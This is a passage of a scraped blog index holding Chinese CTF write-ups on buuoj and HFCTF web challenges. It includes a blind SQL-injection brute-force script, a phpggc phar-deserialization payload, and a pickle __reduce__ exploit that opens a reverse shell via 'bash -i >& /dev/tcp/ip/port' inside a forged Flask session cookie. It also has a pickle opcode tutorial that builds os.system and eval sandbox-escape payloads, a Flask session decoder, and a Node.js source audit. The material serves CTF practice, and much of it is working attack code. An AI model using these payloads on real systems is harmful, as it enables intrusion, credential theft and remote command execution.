stringurl = &#x27;http://a8b2c06b-9cfa-4e27-b9f9-c150d52e0ca6.node4.buuoj.cn/login.php&#x27;alp = string.ascii_letters+string.digits+&quot;$&quot;#/union|select|or|and|\\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid/icode = &#x27;&#x27;str = &#x27;^&#x27;def str2hex(str): return &#x27;0x&#x27;+&#x27;&#x27;.join(hex(ord(x))[2:] for x in str)for i in range(23): for c in alp: if len(str) == 4: str = str[1:] #保持payload中str长度为4 data = &#123; &#x27;username&#x27;:&#x27;c4t\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike binary &#123;&#125;))#&#x27;.format(str2hex(str+c)).replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27; &#125; #print(data[&#x27;password&#x27;]) r = requests.post(url, data=data, allow_redirects=False) if &#x27;login fail&#x27; in r.text: str += c code += c print(str+&#x27; &#x27;+code) break 可以看到，这里出现子串重复，因为是4个4个进行匹配，只要有长度为3的两个子串一样，就会匹配到前面的字串，导致一直循环 这里是gh2重复了，所以我们只能拿到前一部分erghruigh2uygh2 从后往前匹配 12345678910111213141516171819202122232425262728293031323334353637383940#coding=utf-8import requestsimport stringurl = &#x27;http://a8b2c06b-9cfa-4e27-b9f9-c150d52e0ca6.node4.buuoj.cn/login.php&#x27;alp = string.ascii_letters+string.digits+&quot;$&quot;#/union|select|or|and|\\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\\*|,|;|\\r|\\n|\\t|substr|right|left|mid/i&#x27;&#x27;&#x27;data = &#123; &#x27;username&#x27;:&#x27;c4t\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69&amp;&amp;exp(710-(24-length(code)))#&#x27;.replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27;&#125;&#x27;&#x27;&#x27;code = &#x27;&#x27;str = &#x27;$&#x27;def str2hex(str): return &#x27;0x&#x27;+&#x27;&#x27;.join(hex(ord(x))[2:] for x in str)for i in range(23): for c in alp: if len(str) == 4: str = str[:-1] #保持payload中str长度为4 data = &#123; &#x27;username&#x27;:&#x27;c4t\\\\&#x27;, &#x27;password&#x27;:&#x27;||username rlike 0x61646d69 &amp;&amp; exp(710-(code rlike binary &#123;&#125;))#&#x27;.format(str2hex(c+str)).replace(&#x27; &#x27;,&#x27;\\x0b&#x27;), &#x27;code&#x27;:&#x27;1&#x27; &#125; #print(data[&#x27;password&#x27;]) r = requests.post(url, data=data, allow_redirects=False) if &#x27;login fail&#x27; in r.text: str = c + str code = c + code print(str+&#x27; &#x27;+code) break gh2的重复导致从后往前匹配的时候，两个重复子串之前的部分会被跳过 结合上面从前往后匹配的结果 code为：erghruigh2uygh23uiu32ig 以admin身份登录拿到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"sql注入","slug":"CTF/sql注入","permalink":"https://123-prog.github.io/categories/CTF/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://123-prog.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"(HFCTF 2021 Final)tinypng","slug":"HFCTF-2021-Final-tinypng","date":"2021-07-27T09:23:20.000Z","updated":"2021-09-22T10:17:45.284Z","comments":true,"path":"2021/07/27/HFCTF-2021-Final-tinypng/","link":"","permalink":"https://123-prog.github.io/2021/07/27/HFCTF-2021-Final-tinypng/","excerpt":"0x01源码分析，先看一下路由","text":"0x01源码分析，先看一下路由 与根路由POST方法对应的控制类是IndexController，与路由/image路由相关联的是ImageController控制类 分别看一下这两个控制类 IndexController 可以上传一个文件，后缀限定为png，对文件内容有过滤 preg_match(&quot;/&lt;\\?|php|HALT\\_COMPILER/i&quot;, $content ) 这里大概可以猜到是phar反序列化了，过滤__HALT_COMPLIER可以用gzip/bzip2压缩数据绕过，压缩后并不会影响phar://的读取，但需要php有相应的扩展 ImageController 这里对通过GET得到的路径资源进行imgcompress-&gt;compressImg，跟进去看一下 有个getimagesize()，可以触发phar的反序列化 0x02 利用链phpggc一把梭 可以看到版本 用phpggc生成payload 123./phpggc Laravel/RCE7 readfile &#x27;/flag&#x27; --phar phar &gt; 1.phargzip 1.pharmv 1.phar.gz 1.png","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"phar反序列化","slug":"phar反序列化","permalink":"https://123-prog.github.io/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"(HFCTF 2021 Final)easyflask","slug":"HFCTF-2021-Final-easyflask","date":"2021-07-24T15:57:00.000Z","updated":"2021-09-22T10:15:18.209Z","comments":true,"path":"2021/07/24/HFCTF-2021-Final-easyflask/","link":"","permalink":"https://123-prog.github.io/2021/07/24/HFCTF-2021-Final-easyflask/","excerpt":"0x01 源码/file?file=/app/source","text":"0x01 源码/file?file=/app/source 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123; &#x27;uname&#x27;: &#x27;test&#x27;, &#x27;is_admin&#x27;: 0, &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler(): if not session.get(&#x27;u&#x27;): u = pickle.dumps(User()) session[&#x27;u&#x27;] = u return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler(): path = request.args.get(&#x27;file&#x27;) path = os.path.join(&#x27;static&#x27;, path) if not os.path.exists(path) or os.path.isdir(path) \\ or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path: return &#x27;disallowed&#x27; with open(path, &#x27;r&#x27;) as fp: content = fp.read() return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler(): try: u = session.get(&#x27;u&#x27;) if isinstance(u, dict): u = b64decode(u.get(&#x27;b&#x27;)) u = pickle.loads(u) except Exception: return &#x27;uhh?&#x27; if u.is_admin == 1: return &#x27;welcome, admin&#x27; else: return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False) 0x02/admin路由下看到了pickle.loads()，pickle反序列化 /file?file=/proc/self/environ 拿到secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh 下个加密脚本https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py 重命名getSession.py 12345678910111213141516171819202122232425#coding=utf-8import getSessionimport pickleimport osimport requestsUser = type(&#x27;User&#x27;, (object,), &#123; &#x27;uname&#x27;: &#x27;test&#x27;, &#x27;is_admin&#x27;: 0, &#x27;__repr__&#x27;: lambda o: o.uname, &#x27;__reduce__&#x27;: lambda o: (os.system,(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;,))&#125;)#payload = pickle.dumps(User())payload = &quot;&quot;&quot;b&#x27;\\\\x80\\\\x04\\\\x95P\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x8c\\\\x05posix\\\\x94\\\\x8c\\\\x06system\\\\x94\\\\x93\\\\x94\\\\x8c5bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;\\\\x94\\\\x85\\\\x94R\\\\x94.&#x27;&quot;&quot;&quot;secret_key = &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;session_stru = &quot;&#123;&#x27;u&#x27;:&quot;+payload+&quot;&#125;&quot;session = getSession.FSCM.encode(secret_key,session_stru)url = &#x27;http://e3d3f18d-c6b3-4ebe-849b-649f67498bec.node4.buuoj.cn/admin&#x27;cookies = &#123;&#x27;session&#x27;:session&#125;r = requests.get(url, cookies=cookies) 成功反弹shell，拿到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"python web","slug":"CTF/python-web","permalink":"https://123-prog.github.io/categories/CTF/python-web/"}],"tags":[{"name":"flask session伪造","slug":"flask-session伪造","permalink":"https://123-prog.github.io/tags/flask-session%E4%BC%AA%E9%80%A0/"},{"name":"pickle反序列化","slug":"pickle反序列化","permalink":"https://123-prog.github.io/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"pickle 反序列化","slug":"pickle-反序列化","date":"2021-07-24T10:56:09.000Z","updated":"2021-07-24T16:04:58.101Z","comments":true,"path":"2021/07/24/pickle-反序列化/","link":"","permalink":"https://123-prog.github.io/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"0x01 picklepickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine），包含三大部分","text":"0x01 picklepickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine），包含三大部分 1.栈：由list实现，存放临时的数据，操作，参数等等 2.memo: 由dict实现，存放已经序列化的数据，在PVM整个生命周期内，提供存储的空间 3.指令处理器：读取opcode和参数，解释执行，遇到.停止解释 pickle协议版本很多，最容易阅读，也是最容易手写的是**v0**，因为pickle版本向下兼容，所以不必担心版本不兼容出错的问题 举例一个比较简单的利用 123456789101112import pickleimport osclass demo(object): def __reduce__(self): return system,(&#x27;whoami&#x27;,) d1 = demo()pickle_str = pickle.dumps(d1)print(pickle_str)#b&#x27;\\x80\\x03cnt\\nsystem\\nq\\x00X\\x06\\x00\\x00\\x00whoamiq\\x01\\x85q\\x02Rq\\x03.&#x27;#使用pickle.loads(pickle_str)就可以实现命令执行 object.__reduce__(): 重写类的__reduce__()函数，可以使类在实例化的时候按照重写的方式进行，该函数返回一个元组，元组第一个值是调用的函数，第二个值是参数 0x02 opcode各个opcode的用法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485MARK = b&#x27;(&#x27; # push special markobject on stackSTOP = b&#x27;.&#x27; # every pickle ends with STOPPOP = b&#x27;0&#x27; # discard topmost stack itemPOP_MARK = b&#x27;1&#x27; # discard stack top through topmost markobjectDUP = b&#x27;2&#x27; # duplicate top stack itemFLOAT = b&#x27;F&#x27; # push float object; decimal string argumentINT = b&#x27;I&#x27; # push integer or bool; decimal string argumentBININT = b&#x27;J&#x27; # push four-byte signed intBININT1 = b&#x27;K&#x27; # push 1-byte unsigned intLONG = b&#x27;L&#x27; # push long; decimal string argumentBININT2 = b&#x27;M&#x27; # push 2-byte unsigned intNONE = b&#x27;N&#x27; # push NonePERSID = b&#x27;P&#x27; # push persistent object; id is taken from string argBINPERSID = b&#x27;Q&#x27; # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b&#x27;R&#x27; # apply callable to argtuple, both on stackSTRING = b&#x27;S&#x27; # push string; NL-terminated string argumentBINSTRING = b&#x27;T&#x27; # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b&#x27;V&#x27; # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE = b&#x27;X&#x27; # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b&#x27;a&#x27; # append stack top to list below itBUILD = b&#x27;b&#x27; # call __setstate__ or __dict__.update()GLOBAL = b&#x27;c&#x27; # push self.find_class(modname, name); 2 string argsDICT = b&#x27;d&#x27; # build a dict from stack itemsEMPTY_DICT = b&#x27;&#125;&#x27; # push empty dictAPPENDS = b&#x27;e&#x27; # extend list on stack by topmost stack sliceGET = b&#x27;g&#x27; # push item from memo on stack; index is string argBINGET = b&#x27;h&#x27; # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b&#x27;i&#x27; # build &amp; push class instanceLONG_BINGET = b&#x27;j&#x27; # push item from memo on stack; index is 4-byte argLIST = b&#x27;l&#x27; # build list from topmost stack itemsEMPTY_LIST = b&#x27;]&#x27; # push empty listOBJ = b&#x27;o&#x27; # build &amp; push class instancePUT = b&#x27;p&#x27; # store stack top in memo; index is string argBINPUT = b&#x27;q&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b&#x27;r&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b&#x27;s&#x27; # add key+value pair to dictTUPLE = b&#x27;t&#x27; # build tuple from topmost stack itemsEMPTY_TUPLE = b&#x27;)&#x27; # push empty tupleSETITEMS = b&#x27;u&#x27; # modify dict by adding topmost key+value pairsBINFLOAT = b&#x27;G&#x27; # push float; arg is 8-byte float encodingTRUE = b&#x27;I01\\n&#x27; # not an opcode; see INT docs in pickletools.pyFALSE = b&#x27;I00\\n&#x27; # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO = b&#x27;\\x80&#x27; # identify pickle protocolNEWOBJ = b&#x27;\\x81&#x27; # build object by applying cls.__new__ to argtupleEXT1 = b&#x27;\\x82&#x27; # push object from extension registry; 1-byte indexEXT2 = b&#x27;\\x83&#x27; # ditto, but 2-byte indexEXT4 = b&#x27;\\x84&#x27; # ditto, but 4-byte indexTUPLE1 = b&#x27;\\x85&#x27; # build 1-tuple from stack topTUPLE2 = b&#x27;\\x86&#x27; # build 2-tuple from two topmost stack itemsTUPLE3 = b&#x27;\\x87&#x27; # build 3-tuple from three topmost stack itemsNEWTRUE = b&#x27;\\x88&#x27; # push TrueNEWFALSE = b&#x27;\\x89&#x27; # push FalseLONG1 = b&#x27;\\x8a&#x27; # push long from &lt; 256 bytesLONG4 = b&#x27;\\x8b&#x27; # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES = b&#x27;B&#x27; # push bytes; counted binary string argumentSHORT_BINBYTES = b&#x27;C&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b&#x27;\\x8c&#x27; # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8 = b&#x27;\\x8d&#x27; # push very long stringBINBYTES8 = b&#x27;\\x8e&#x27; # push very long bytes stringEMPTY_SET = b&#x27;\\x8f&#x27; # push empty set on the stackADDITEMS = b&#x27;\\x90&#x27; # modify set by adding topmost stack itemsFROZENSET = b&#x27;\\x91&#x27; # build frozenset from topmost stack itemsNEWOBJ_EX = b&#x27;\\x92&#x27; # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL = b&#x27;\\x93&#x27; # same as GLOBAL but using names on the stacksMEMOIZE = b&#x27;\\x94&#x27; # store top of the stack in memoFRAME = b&#x27;\\x95&#x27; # indicate the beginning of a new frame# Protocol 5BYTEARRAY8 = b&#x27;\\x96&#x27; # push bytearrayNEXT_BUFFER = b&#x27;\\x97&#x27; # push next out-of-band bufferREADONLY_BUFFER = b&#x27;\\x98&#x27; # make top of stack readonly 几个常用的： 1.b&#39;R&#39;: __reduce__()函数对应的就是这个操作码，选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数，可以执行命令，除此之外i,o这两个opcode也是可以实现命令执行或实例化对象 2.b&#39;c&#39;: 可以实现python中模块的引入，使用方法是c[module]\\n[instance]\\n，将获得的对象入栈 3.b&#39;(&#39;: MARK，入栈 4.b&#39;)&#39;: 向栈中压入一个空元组 5.b&#39;t&#39;: 寻找上面的一个MARK，将之间内容存为tuple(元组) 6.b&#39;d&#39;: 寻找上面的一个MARK，将之间的内容组成dict(字典)，之间的对象必须是偶数个，作为key-value对 7.b&#39;p&#39;：将栈顶对象存至memo，等到要用的时候可以拿出来，使用方法是px\\n(x可以是1，2，3…)，后面接一个换行，x在这里可以理解为在memo（一个字典）中的key值，注意此操作并不会对栈造成影响 8.b&#39;g&#39;: 结合p使用，从memo中将指定对象压栈，使用方法，gx\\n，同样接一个换行 9.b&#39;0&#39;:pop操作，从栈中弹出一个对象 10.b&#39;b&#39;:赋值操作，可以用于对象的实例化，将栈中的第一个元素（属性:属性值的字典)，赋值给第二个对象（类），实例化 几个opcode的使用例子 1234567891011121314opcode = b&#x27;&#x27;&#x27;cossystem(S&#x27;whoami&#x27;tR.&#x27;&#x27;&#x27;opcode1 = b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;iossystem.&#x27;&#x27;&#x27;opcode2 = b&#x27;&#x27;&#x27;(cossystemS&#x27;whoami&#x27;o.&#x27;&#x27;&#x27; 上面三个都可以实现命令的执行 但官方针对pickle的安全问题，对引入模块做了限制，用白名单的方式，其中涉及到pickle.Unpickler.find_class()这个方法，在opcode做出引入模块的操作时，会调用这个方法（当出现c、i、b&#39;\\x93&#39;时，会调用），限制也是在这里面实现 例子： 12345678910safe_builtins = &#123;&#x27;range&#x27;,&#x27;complex&#x27;,&#x27;set&#x27;,&#x27;frozenset&#x27;,&#x27;slice&#x27;,&#125;class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %(module, name)) 重写这个方法，限制了引入的模块只能是builtins，子模块为&#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125; 0x03 题目例子Code-Breaking:picklecode题目将pickle能够引入的模块限定为builtins，并且设置了子模块黑名单：&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125; 黑名单里面没有getattr，思路就是通过getattr拿到builtins的子模块eval实现任意代码执行 首先要拿到builtins模块，由于pickle无法引入一级模块（无父模块，解决方法，通过全局变量获取，在全局变量中存在builtins这个模块，因为已经引入了，builtins.globals()返回全局变量的dict 要从字典中拿到builtins，还需要用到方法dict.get，pickle不支持点访问，要使用的方法仍然是，先拿到dict模块。用getattr获取get方法 最后的payload： 1getattr(getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;) 根据这个payload可以手写opcode 1234567891011121314151617181920212223import pickle#getattr(getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;),&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)code = b&#x27;&#x27;&#x27;cbuiltinsgetattrp0(cbuiltinsdictS&#x27;get&#x27;tRp1cbuiltinsglobals)Rp200g1(g2S&#x27;builtins&#x27;tRp30g0(g3S&#x27;eval&#x27;tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;tR.&#x27;&#x27;&#x27;pickle.loads(code) 0x04 pker使用使用pker，可以更方便的编写pickle opcode（版本是0） https://github.com/eddieivan01/pker 使用方法： 1234567891011121314151617181920GLOBAL(&#39;os&#39;, &#39;system&#39;) &#x3D;&gt; cos\\nsystem\\nINST(&#39;os&#39;, &#39;system&#39;, &#39;ls&#39;) &#x3D;&gt; (S&#39;ls&#39;\\nios\\nsystem\\nOBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;ls&#39;) &#x3D;&gt; (cos\\nsystem\\nS&#39;ls&#39;\\no这三个分别对应opcode中的b&#39;c&#39;,b&#39;i&#39;,b&#39;o&#39;xxx(xxx,...)对应b&#39;R&#39;更新列表或字典的话，直接使用[]list[0]&#x3D;123dict[&#39;var&#39;] &#x3D; &#39;var1&#39;对应opcode中的b&#39;s&#39;对对象属性赋值xx.attr &#x3D; 123对应opcode中的b&#39;s&#39;return &#x3D;&gt; .return var &#x3D;&gt; g_\\n.return 1 &#x3D;&gt; I1\\n. 例题：还是上面那道Code-Breaking: picklecode pker代码： 12345678getattr &#x3D; GLOBAL(&#39;builtins&#39;,&#39;getattr&#39;)dict &#x3D; GLOBAL(&#39;builtins&#39;,&#39;dict&#39;)dict_get &#x3D; getattr(dict,&#39;get&#39;)globals &#x3D; GLOBAL(&#39;builtins&#39;,&#39;globals&#39;)()builtins &#x3D; dict_get(globals,&#39;builtins&#39;)eval &#x3D; getattr(builtins,&#39;eval&#39;)eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)return 1b&#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\&#39;get\\&#39;\\ntRp2\\n0cbuiltins\\nglobals\\n(tRp3\\n0g2\\n(g3\\nS\\&#39;builtins\\&#39;\\ntRp4\\n0g0\\n(g4\\nS\\&#39;eval\\&#39;\\ntRp5\\n0g5\\n(S\\&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\\&#39;\\ntR.&#39;","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"pickle","slug":"pickle","permalink":"https://123-prog.github.io/tags/pickle/"},{"name":"反序列化","slug":"反序列化","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"opcode使用","slug":"opcode使用","permalink":"https://123-prog.github.io/tags/opcode%E4%BD%BF%E7%94%A8/"},{"name":"pker使用","slug":"pker使用","permalink":"https://123-prog.github.io/tags/pker%E4%BD%BF%E7%94%A8/"}]},{"title":"flask session问题","slug":"flask-session问题","date":"2021-07-23T15:14:08.000Z","updated":"2021-07-24T16:05:16.141Z","comments":true,"path":"2021/07/23/flask-session问题/","link":"","permalink":"https://123-prog.github.io/2021/07/23/flask-session%E9%97%AE%E9%A2%98/","excerpt":"0x01 flask session篡改","text":"0x01 flask session篡改 flask session 构成：data.timestamp.signal flask将session存储在客户端的cookie中，那么就有被篡改的可能，flask用签名解决这个问题，在不知道secret_key的情况下，是无法伪造签名的，一但拿到secret_key，就可以篡改session flask序列化session的步骤： 1.将对象转换成json字符串，作为session的数据部分 2.如果数据压缩后长度更短，用zlib库压缩 3.将数据进行base64编码 4.通过hmac算法计算出数据的签名，将签名附在数据后，用”.“分割 签名可以验证数据是否被更改过 根据这个过程，可以用这个脚本解密出数据: 1234567891011121314151617181920212223242526272829303132import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(&#x27;.&#x27;,1) payload, timestamp = payload.rsplit(&#x27;.&#x27;,1) decompress = False if payload.startswith(&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&quot;解码失败&quot;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&quot;Could not zlib decompress the payload before decoding the payload&quot;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1])) 如果可以通过其他方式拿到secret_key的话，就可以更改数据，生成签名，篡改session 生成session的脚本： https://github.com/noraj/flask-session-cookie-manager","categories":[{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"客户端session","slug":"客户端session","permalink":"https://123-prog.github.io/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/"},{"name":"session伪造","slug":"session伪造","permalink":"https://123-prog.github.io/tags/session%E4%BC%AA%E9%80%A0/"}]},{"title":"buuoj NodeProxy","slug":"buuoj-NodeProxy","date":"2021-07-22T02:59:14.000Z","updated":"2021-09-22T10:14:44.234Z","comments":true,"path":"2021/07/22/buuoj-NodeProxy/","link":"","permalink":"https://123-prog.github.io/2021/07/22/buuoj-NodeProxy/","excerpt":"0x01 审计源码/source","text":"0x01 审计源码/source 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154// node 8.12.0const createError = require(&#x27;http-errors&#x27;);const express = require(&#x27;express&#x27;);const http = require(&#x27;http&#x27;);const path = require(&#x27;path&#x27;);const cookieParser = require(&#x27;cookie-parser&#x27;);const logger = require(&#x27;morgan&#x27;);const fs = require(&quot;fs&quot;)const crypto = require(&#x27;crypto&#x27;);const app = express();const flag = fs.readFileSync(&#x27;/flag&#x27;, &quot;utf-8&quot;);let session = require(&#x27;express-session&#x27;);let FileStore = require(&#x27;session-file-store&#x27;)(session);let identityKey = &#x27;session&#x27;;app.use(session(&#123; name: identityKey, secret: crypto.randomBytes(32).toString(&#x27;hex&#x27;), store: new FileStore(), saveUninitialized: false, resave: false, cookie: &#123; maxAge: 1000 * 60 * 600 &#125;&#125;));// view engine setupapp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123;extended: false&#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.all(&#x27;*&#x27;, function (req, res, next) &#123; if (req.session.username === undefined) &#123; req.session.username = &quot;guest&quot;; req.session.is_verified = false; &#125; next();&#125;);function checkIP(req) &#123; let ip = req.connection.remoteAddress; if (ip.substr(0, 7) === &quot;::ffff:&quot;) &#123; ip = ip.substr(7) &#125; // console.log(ip) return ip === &#x27;127.0.0.1&#x27;;&#125;app.get(&#x27;/&#x27;, function (req, res, next) &#123; // console.log(req.session.username) res.render(&#x27;index&#x27;, &#123;title: &#x27;Node Proxy&#x27;, username: req.session.username&#125;);&#125;);app.get(&#x27;/test&#x27;, function (req, res, next) &#123; res.send(&#x27;test test&#x27;);&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/app.js&#x27;));&#125;);app.post(&#x27;/register&#x27;, function (req, res) &#123; if (req.body.username !== undefined) &#123; req.session.username = req.body.username; req.session.is_verified = false; res.render(&#x27;message&#x27;, &#123;message: &#x27;You have registered successfully!&#x27;&#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;No username provided!&#x27;&#125;); &#125;&#125;);app.post(&#x27;/verify&#x27;, function (req, res) &#123; if (checkIP(req) !== true) &#123; return res.status(403).render(&#x27;message&#x27;, &#123;message: &#x27;You are not from LOCAL!&#x27;&#125;); &#125; let token = req.body.token; console.log(&#x27;req: /verify &#x27; + req.session.username) if (token === &#x27;you_will_never_know&#x27; &amp;&amp; req.session.username !== &#x27;admin&#x27;) &#123; req.session.is_verified = true; console.log(req.session.username + &#x27; VERIFIED!&#x27;) res.render(&#x27;message&#x27;, &#123;message: &#x27;VERIFIED SUCCESS!&#x27;&#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;NO!&#x27;&#125;); &#125;&#125;);app.get(&#x27;/flag&#x27;, function (req, res) &#123; if (req.session.is_verified !== true) &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;NO! You are not verified!&#x27;&#125;); &#125; else if (req.session.username == &#x27;admin&#x27;) &#123; res.render(&#x27;message&#x27;, &#123;message: flag&#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;NO! You are not admin!&#x27;&#125;); &#125;&#125;);app.get(&#x27;/proxy&#x27;, function (req, res) &#123; let url = req.query.url ? req.query.url : &#x27;&#x27;; if (url) &#123; try &#123; http.get(url, (r) =&gt; &#123; const &#123;statusCode&#125; = r; if (r &amp;&amp; statusCode === 200) &#123; r.setEncoding(&#x27;utf8&#x27;); let data = &#x27;&#x27;; r.on(&#x27;data&#x27;, (chunk) =&gt; &#123; data += chunk; &#125;); r.on(&#x27;end&#x27;, () =&gt; &#123; res.send(data); &#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;error&#x27;&#125;); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; if (e.code === &quot;ECONNRESET&quot;) &#123; res.send(&quot;Timeout occurs&quot;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: e.message&#125;); &#125; &#125;); &#125; catch (error) &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;error&#x27;&#125;); &#125; &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;Missing url param!&#x27;&#125;); &#125;&#125;)// catch 404 and forward to error handlerapp.use(function (req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function (err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&#x27;error&#x27;);&#125;);// listen on port 3000module.exports = app; 分析几个路由路径 /register注册一个用户，将用户名写进session /verify认证，只能本地访问，满足条件token === &#39;you_will_never_know&#39; &amp;&amp; req.session.username !== &#39;admin&#39;认证成功 /flag获取flag，需要满足用户名为admin（注意这里是弱类型比较）且session中的认证信息为True 